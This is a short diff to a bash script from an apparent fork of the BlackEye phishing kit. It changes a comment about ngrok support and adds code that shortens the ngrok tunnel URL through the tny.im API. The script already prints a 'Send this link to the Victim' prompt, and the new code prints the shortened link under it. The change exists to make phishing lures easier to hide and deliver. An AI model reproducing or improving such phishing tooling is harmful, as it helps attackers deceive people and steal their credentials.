@@ -1,8 +1,7 @@
 #!/bin/bash
 
 # Upgraded by: @Git-Ankitraj (https://github.com/Git-Ankitraj/blackeye-im)
-#Fixed support of ngrok.In the previous version of blackeye,you did not get to see the ngrok link while running blackeye but now that issue has been fixed in this new version of blackeye, that is , blackeye-im(improved).
-
+#Enhanced ngrok tunnelling
 trap 'printf "\n";stop;exit 1' 2
 
 
@@ -442,6 +441,11 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
+short_link=`wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=$link\&keyword=$2`
+printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
+echo ""
+echo ""
+
 checkfound
 }
 checkfound() {
